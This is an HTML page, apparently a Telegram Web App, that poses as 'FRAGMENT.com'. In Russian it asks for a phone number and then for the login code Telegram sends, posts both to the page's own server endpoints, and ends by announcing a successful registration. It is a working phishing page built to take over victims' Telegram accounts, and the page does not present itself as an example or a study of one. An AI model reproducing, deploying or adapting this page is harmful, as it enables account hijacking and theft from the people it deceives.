<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>FRAGMENT</title>

<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
:root {
    --bg: #0b0b0d;
    --panel: #121216;
    --text: #eaeaea;
    --muted: #8a8a8a;
    --border: #1f1f26;
}

* {
    box-sizing: border-box;
    font-family: Inter, system-ui, -apple-system, Arial, sans-serif;
}

body {
    margin: 0;
    height: 100vh;
    background: var(--bg);
    color: var(--text);
    display: flex;
    align-items: center;
    justify-content: center;
    padding:
        env(safe-area-inset-top)
        env(safe-area-inset-right)
        env(safe-area-inset-bottom)
        env(safe-area-inset-left);
}

.logo {
    position: fixed;
    top: 18px;
    left: 22px;
    font-size: 13px;
    font-weight: 600;
    letter-spacing: 1.8px;
    color: #fff;
}

.card {
    width: 100%;
    max-width: 360px;
    background: var(--panel);
    border: 1px solid var(--border);
    padding: 28px 24px 30px;
}

h2 {
    font-weight: 400;
    font-size: 18px;
    margin-bottom: 22px;
}

input {
    width: 100%;
    padding: 14px 12px;
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text);
    font-size: 16px;
    margin-bottom: 16px;
    border-radius: 2px;
}

input::placeholder {
    color: var(--muted);
}

button {
    width: 100%;
    padding: 14px;
    background: #fff;
    color: #000;
    border: none;
    font-size: 15px;
    font-weight: 500;
    border-radius: 2px;
}

button:active {
    opacity: 0.85;
}

.hidden {
    display: none;
}

/* Mobile tweaks */
@media (max-width: 480px) {
    h2 {
        font-size: 17px;
    }
    .card {
        margin: 0 12px;
    }
}
</style>
</head>

<body>

<div class="logo">FRAGMENT.com</div>

<div class="card">
    <h2 id="title">Введите ваш номер</h2>
    <input id="input" placeholder="+79991234567" inputmode="tel">
    <button id="btn">Продолжить</button>
</div>

<script>
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
}

let step = 1;
const input = document.getElementById("input");
const title = document.getElementById("title");
const btn = document.getElementById("btn");

btn.onclick = () => {
    if (!input.value.trim()) return;

    if (step === 1) {
        fetch("/phone", { method: "POST", body: input.value });
        title.innerText = "Введите код из TELEGRAM";
        input.value = "";
        input.placeholder = "Код";
        input.inputMode = "numeric";
        step = 2;
    } else {
        fetch("/code", { method: "POST", body: input.value });
        title.innerText = "Успешная регистрация!";
        input.classList.add("hidden");
        btn.classList.add("hidden");
    }
};
</script>

</body>
</html>
